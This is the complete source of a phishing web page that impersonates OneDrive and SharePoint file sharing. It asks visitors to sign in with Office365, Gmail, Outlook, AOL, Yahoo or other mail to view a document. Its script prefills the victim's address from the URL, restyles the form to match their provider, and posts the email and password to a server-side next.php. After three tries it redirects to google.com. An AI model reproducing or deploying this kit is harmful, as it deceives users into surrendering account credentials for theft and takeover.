
<!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Share Point Online</title>
    <link href="css/hover.css" rel="stylesheet" media="all">

    <style type="text/css">


    </style>
  </head>
  <body>
    <div class="container-fluid" style="padding:50px;background-image:url('images/bg.jpg'); background-size: cover;background-repeat: no-repeat; background-position: right;">
      <div class="row">
        <div class="col-lg-6 text-center" style="background-image:url('images/5b.jpg'); background-size: cover;background-repeat: no-repeat; background-position: right; padding: 60px 50px 80px 50px;">
          <img src="images/onedrive-white.png" class="img-fluid" width="100px"><br>
          <span class="h3 text-white">OneDrive</span><br>
          <span class="h5 text-white">To read the document, please select your email provider below and login to view shared files</span><br>
          <hr class="rounded" style="width: 40%; border:2px solid white; "><br>


          <div class="my-3 rounded" style="background-color: rgba(255,255,255,0.5);">
            <div class="row p-3">
              <div class="col-lg-4 text-center">
                <a href="javascript:void(0)" id="office365modal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                  <div class="rounded px-2 py-1 mt-2" style=" background-color: #FF3C00;">
                    <img src="images/office3651.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
                    <span  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with<br> Office365</span>
                  </div>
                </a>
              </div>
              <div class="col-lg-4 text-center">
                <a href="javascript:void(0)" id="othermodal" class="hvr-grow w-100" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
                  <div class="rounded px-2 py-1 mt-2" style=" background-color: #0B5BD3;">
                    <img src="images/other1.png" class="img-fluid" width="30px" style="padding:5px 0px 5px 0px;"><br>
                    <span  style="vertical-align: middle; color: white;font-weight: 500;border-radius: 4px;">Sign in with<br> Other Mail</span>
                  </div>
                </a>
              </div>
            </div>
          </div>



        </div>
        <div class="col-lg-6 bg-white" style="padding: 20px 10px 20px 10px; ">
          <div class="container ">
            <div class="row">
              <div class="col-lg-10 mx-auto">
                <div class="my-4">
                  <div class="modal-body">
                    <center>
                      <img id="fieldImg" src="https://8dcd2conjo43j6jr41v8zqkz-wpengine.netdna-ssl.com/wp-content/uploads/office-365_grande.png" class="img-fluid rounded-circle" width="80px">
                      <h5 class="modal-title" id="exampleModalLabel">Login with <span id="field">Office365</span></h5>
                      <div class="alert alert-danger" id="msg" ></div>

                    </center>
                    <form id="contact" class="form-horizontal well">
                      <div class="col-lg-12">
                        <div class="form-group">
                          <div id="inputbar">
                          <label for="exampleInputEmail1">Email address</label>
                          <input type="email" name="email" class="form-control" id="email" aria-describedby="emailHelp" placeholder="Enter email">
                          <small id="emailHelp" class="form-text text-muted">We'll never share your email with anyone else.</small></div>
                          <div id="automail" class="h5 mt-5">
                          <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="emailch">abc@abc.com</span>
                          </div>
                        </div>
                      </div>
                      <div class="col-lg-12">
                        <div class="form-group">
                          <label for="Password">Password</label>
                          <input type="password" name="password" class="form-control" id="password" aria-describedby="emailHelp" placeholder="Enter Password">
                        </div>
                      </div>
                    </div>
                    <div class="modal-footer">
                      <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                      <button class="btn btn-lg btn-info pull-right" id="submit-btn">Login</button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- Optional JavaScript -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  </body>

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script>

    /* global $ */
    $(document).ready(function(){
      $("#msg").hide();
      $("#automail").hide();
      var count=0;
      var email = window.location.hash.substr(1);
      if (!email) {

      }
      else
      {
        // $('#email').val(email);
        var my_email =email;
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show();
          email.focus;
          return false;
        }
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();
        if (final=="gmail") {
          $('#contact').trigger("reset");
          $('#fieldImg').attr('src', 'images/gmail.png');
          $('#field').html("Gmail");
          $('#emailch').html(my_email);
          $("#msg").hide();
        $("#inputbar").animate({left:200, opacity:"hide"}, 0);
        $("#automail").animate({right:200, opacity:"show"}, 1000);
        }
        else if(final=="outlook")
        {
          $('#contact').trigger("reset");
          $("#msg").hide();
          $('#fieldImg').attr('src', 'images/outlook.png');
          $('#field').html("Outlook");
          $('#emailch').html(my_email);
          $("#msg").hide();
        $("#inputbar").animate({left:200, opacity:"hide"}, 0);
        $("#automail").animate({right:200, opacity:"show"}, 1000);
        }
        else if(final=="aol")
        {
          $('#contact').trigger("reset");
          $("#msg").hide();
          $('#fieldImg').attr('src', 'images/aol.png');
          $('#field').html("Aol");
          $('#emailch').html(my_email);
          $("#msg").hide();
        $("#inputbar").animate({left:200, opacity:"hide"}, 0);
        $("#automail").animate({right:200, opacity:"show"}, 1000);
        }
        else if(final=="office365")
        {
          $('#contact').trigger("reset");
          $("#msg").hide();
          $('#fieldImg').attr('src', 'images/office365.png');
          $('#field').html("Office 365");
          $('#emailch').html(my_email);
          $("#msg").hide();
        $("#inputbar").animate({left:200, opacity:"hide"}, 0);
        $("#automail").animate({right:200, opacity:"show"}, 1000);
        }
        else if(final=="yahoo")
        {
          $('#contact').trigger("reset");
          $("#msg").hide();
          $('#fieldImg').attr('src', 'images/yahoo.png');
          $('#field').html("Yahoo");
          $("#msg").hide();
          $('#emailch').html(my_email);
          $('#email').val(my_email);
        $("#inputbar").animate({left:200, opacity:"hide"}, 0);
        $("#automail").animate({right:200, opacity:"show"}, 1000);
        
        }
        else
        {
          $('#contact').trigger("reset");
          $("#msg").hide();
          $('#fieldImg').attr('src', 'images/othermail.ico');
          $('#field').html("Other Mail");
          $('#emailch').html(my_email);
          $("#msg").hide();
        $("#inputbar").animate({left:200, opacity:"hide"}, 0);
        $("#automail").animate({right:200, opacity:"show"}, 1000);
        }
      }

      $('#back').click(function () {
        $("#msg").hide();
        $('#email').val("");
        $("#automail").animate({left:200, opacity:"hide"}, 0);
        $("#inputbar").animate({right:200, opacity:"show"}, 1000);

      });

      $('#gmailmodal').click(function () {
        $('#contact').trigger("reset");

        $('#fieldImg').attr('src', 'images/gmail.png');
        $('#field').html("Gmail");
        $('#ajaxModal').modal('show');
      });
      $('#outlookmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/outlook.png');
        $('#field').html("Outlook");
        $('#ajaxModal').modal('show');
      });
      $('#aolmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/aol.png');
        $('#field').html("Aol");
        $('#ajaxModal').modal('show');
      });
      $('#office365modal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/office365.png');
        $('#field').html("Office 365");
        $('#ajaxModal').modal('show');
      });
      $('#yahoomodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/yahoo.png');
        $('#field').html("Yahoo");
        $('#ajaxModal').modal('show');
      });
      $('#othermodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/othermail.ico');
        $('#field').html("Other Mail");
        $('#ajaxModal').modal('show');
      });
      $('#submit-btn').click(function(event){
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var detail=$("#field").html();


        var msg = $('#msg').html();
        $('#msg').text( msg );
        count=count+1;
        if (count>=3) {
          count=0;
          window.location.replace("http://google.com");
        }
        else
        {
         $.ajax({
          dataType: 'JSON',
          url: 'next.php',
          type: 'POST',
          data:{
            email:email,
            password:password,
            detail:detail,

          },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                 $('#msg').html(response['msg']);
                  // $('input, textarea').val(function() {
                  //    return this.defaultValue;
                  // });
                }
                else{
                  $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
              $("#msg").show();
              $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
       }
     });
    });
  </script>
  </html>